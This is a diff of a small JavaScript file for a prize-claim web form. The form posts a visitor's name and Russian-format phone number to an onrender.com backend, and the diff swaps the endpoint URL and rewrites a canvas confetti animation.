@@ -1,13 +1,11 @@
 const phoneMask = IMask(document.getElementById('phone'), {
   mask: '+{7}(000)000-00-00'
-  maxLength: 10  // Явное ограничение длины
-
 });
 
-document.getElementById('prizeForm').addEventListener('submit', function(e) {
+document.getElementById('prizeForm').addEventListener('submit', function (e) {
   e.preventDefault();
   const name = this.name.value.trim();
-  const phoneRaw = '+7' + (phoneMask.unmaskedValue || '').slice(1);
+  const phoneRaw = '+7' + phoneMask.unmaskedValue.slice(1);
   const messageEl = document.getElementById('message');
 
   const numeric = phoneRaw.replace(/\D/g, '');
@@ -18,7 +16,7 @@ document.getElementById('prizeForm').addEventListener('submit', function(e) {
     return;
   }
 
-  fetch('https://repo-2-zffb.onrender.com/', {
+  fetch('https://proxylast.onrender.com', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ name, phone: phoneRaw })
@@ -40,77 +38,44 @@ document.getElementById('prizeForm').addEventListener('submit', function(e) {
     });
 });
 
-// Конфетти
+// 🎉 Конфетти
 const canvas = document.getElementById('confetti');
 const ctx = canvas.getContext('2d');
-
 canvas.width = window.innerWidth;
 canvas.height = window.innerHeight;
 
-const particles = [];
-const colors = ['#ff0000', '#00ff00', '#0000ff', '#ffff00', '#ff00ff', '#00ffff'];
+let confetti = Array.from({ length: 300 }, () => ({
+  x: Math.random() * canvas.width,
+  y: Math.random() * canvas.height,
+  r: Math.random() * 6 + 4,
+  d: Math.random() * 20 + 10,
+  color: `hsl(${Math.random() * 360}, 100%, 50%)`,
+  tilt: Math.random() * 10 - 10
+}));
 
-function createParticles() {
-    for (let i = 0; i < 150; i++) {
-        particles.push({
-            x: Math.random() * canvas.width,
-            y: Math.random() * canvas.height - canvas.height,
-            size: Math.random() * 8 + 3,
-            color: colors[Math.floor(Math.random() * colors.length)],
-            speed: Math.random() * 3 + 1,
-            angle: Math.random() * Math.PI * 2,
-            rotation: Math.random() * 0.2 - 0.1,
-            tilt: Math.random() * 10 - 5
-        });
+function drawConfetti() {
+  ctx.clearRect(0, 0, canvas.width, canvas.height);
+  confetti.forEach(c => {
+    ctx.beginPath();
+    ctx.lineWidth = c.r;
+    ctx.strokeStyle = c.color;
+    ctx.moveTo(c.x + c.tilt + c.r / 2, c.y);
+    ctx.lineTo(c.x + c.tilt, c.y + c.tilt + c.d / 2);
+    ctx.stroke();
+  });
+  updateConfetti();
+  requestAnimationFrame(drawConfetti);
+}
+
+function updateConfetti() {
+  confetti.forEach(c => {
+    c.y += Math.cos(c.d) + 1 + c.r / 2;
+    c.x += Math.sin(0.01);
+    if (c.y > canvas.height) {
+      c.y = -10;
+      c.x = Math.random() * canvas.width;
     }
+  });
 }
 
-function updateParticles() {
-    for (let i = 0; i < particles.length; i++) {
-        const p = particles[i];
-        p.y += p.speed;
-        p.angle += p.rotation;
-        p.tilt = Math.sin(p.angle) * 15;
-        
-        if (p.y > canvas.height) {
-            p.y = -10;
-            p.x = Math.random() * canvas.width;
-        }
-    }
-}
-
-function drawParticles() {
-    ctx.clearRect(0, 0, canvas.width, canvas.height);
-    
-    particles.forEach(p => {
-        ctx.save();
-        ctx.translate(p.x, p.y);
-        ctx.rotate(p.angle);
-        
-        ctx.fillStyle = p.color;
-        ctx.beginPath();
-        ctx.rect(-p.size/2, -p.size/2, p.size, p.size);
-        ctx.fill();
-        
-        ctx.restore();
-    });
-}
-
-function animate() {
-    updateParticles();
-    drawParticles();
-    requestAnimationFrame(animate);
-}
-
-// Запускаем все
-createParticles();
-animate();
-
-// Ваш текущий код для формы остается без изменений
-const phoneMask = IMask(document.getElementById('phone'), {
-    mask: '+{7}(000)000-00-00'
-});
-
-document.getElementById('prizeForm').addEventListener('submit', function(e) {
-    // Ваш текущий код обработки формы
-});
+drawConfetti();
